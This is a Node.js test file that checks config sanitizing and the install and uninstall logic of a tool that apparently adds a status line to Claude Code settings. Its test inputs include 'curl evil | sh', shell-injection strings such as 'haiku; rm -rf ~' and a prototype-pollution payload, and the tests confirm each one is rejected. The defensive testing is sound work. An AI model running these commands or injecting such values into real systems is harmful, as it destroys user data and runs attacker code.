const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const { sanitizeUserPatch, normalize, publicView, DEFAULTS } = require('../src/config');

test('UI patches cannot set internal or dangerous keys', () => {
  const out = sanitizeUserPatch({
    previousStatusLine: { command: 'curl evil | sh' },
    anchorModel: 'haiku & calc.exe',
    warnAtPercent: 80,
    notifications: 'yes',
    anchors: ['08:00', '25:99'],
    __proto__: { polluted: true },
  });
  assert.deepEqual(out, { warnAtPercent: 80 });
  assert.equal({}.polluted, undefined);
});

test('values out of range are rejected', () => {
  assert.deepEqual(sanitizeUserPatch({ warnAtPercent: 150, remindBeforeResetMinutes: -5 }), {});
  assert.deepEqual(sanitizeUserPatch({ warnAtPercent: 0, remindBeforeResetMinutes: 120 }), { warnAtPercent: 0, remindBeforeResetMinutes: 120 });
  assert.deepEqual(sanitizeUserPatch({ anchors: ['08:00', '13:30'] }), { anchors: ['08:00', '13:30'] });
});

test('a tampered config file cannot inject a model name', () => {
  const cfg = normalize({ anchorModel: 'haiku; rm -rf ~', warnAtPercent: 'x' });
  assert.equal(cfg.anchorModel, DEFAULTS.anchorModel);
  assert.equal(cfg.warnAtPercent, DEFAULTS.warnAtPercent);
});

test('internal fields are not exposed to the UI', () => {
  const v = publicView({ ...DEFAULTS, previousStatusLine: { command: 'x' } });
  assert.equal('previousStatusLine' in v, false);
  assert.equal('anchorModel' in v, false);
});

// Runs install.js against a throwaway HOME / Claude config dir.
function runInstall(home, claudeDir, action) {
  const script = `const r = require(${JSON.stringify(path.join(__dirname, '../src/install.js'))}).${action}(); process.stdout.write(JSON.stringify(r));`;
  return JSON.parse(execFileSync(process.execPath, ['-e', script], {
    env: { ...process.env, HOME: home, USERPROFILE: home, CLAUDE_CONFIG_DIR: claudeDir }, encoding: 'utf8',
  }));
}

test('connect keeps other settings, backs up, and disconnect restores the old status line', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'fh-'));
  const claudeDir = path.join(home, '.claude');
  fs.mkdirSync(claudeDir);
  const settingsFile = path.join(claudeDir, 'settings.json');
  const original = { model: 'opus', statusLine: { type: 'command', command: 'echo mine' } };
  fs.writeFileSync(settingsFile, JSON.stringify(original));

  assert.deepEqual(runInstall(home, claudeDir, 'connect'), { ok: true });
  const after = JSON.parse(fs.readFileSync(settingsFile, 'utf8'));
  assert.equal(after.model, 'opus');
  assert.match(after.statusLine.command, /\.fivehour[\\/]statusline\.js"$/);
  assert.ok(fs.existsSync(`${settingsFile}.fivehour.bak`));
  assert.ok(fs.existsSync(path.join(home, '.fivehour', 'statusline.js')));

  assert.deepEqual(runInstall(home, claudeDir, 'connect'), { ok: true, already: true });
  assert.deepEqual(runInstall(home, claudeDir, 'disconnect'), { ok: true });
  assert.deepEqual(JSON.parse(fs.readFileSync(settingsFile, 'utf8')), original);
});

test('connect refuses to overwrite an unreadable settings file', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'fh-'));
  const claudeDir = path.join(home, '.claude');
  fs.mkdirSync(claudeDir);
  const settingsFile = path.join(claudeDir, 'settings.json');
  fs.writeFileSync(settingsFile, '{ broken');
  const r = runInstall(home, claudeDir, 'connect');
  assert.equal(r.ok, false);
  assert.match(r.error, /isn't valid JSON/);
  assert.equal(fs.readFileSync(settingsFile, 'utf8'), '{ broken');
});

test('update settings: users can turn checks off, but not fake the notified version', () => {
  assert.deepEqual(sanitizeUserPatch({ checkUpdates: false, notifiedUpdate: '9.9.9' }), { checkUpdates: false });
  assert.equal(normalize({ notifiedUpdate: '1.2.3; rm -rf' }).notifiedUpdate, null);
  assert.equal(normalize({ notifiedUpdate: '0.2.0' }).notifiedUpdate, '0.2.0');
  assert.equal('notifiedUpdate' in publicView({ ...DEFAULTS, notifiedUpdate: '0.2.0' }), false);
});
